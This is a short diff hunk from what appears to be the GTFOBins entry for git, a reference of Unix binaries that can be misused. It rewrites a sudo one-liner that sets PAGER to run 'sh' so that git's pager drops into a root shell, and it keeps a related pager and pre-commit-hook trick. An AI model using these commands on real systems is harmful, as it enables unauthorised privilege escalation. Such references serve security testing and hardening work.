@@ -14,7 +14,7 @@ functions:
         mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
         git -C "$TF" commit --allow-empty -m x
   sudo:
-    - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
+    - code: sudo PAGER='sh -c "exec sh 0<&1"' git -p help
     - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
       code: |
         sudo git -p help config
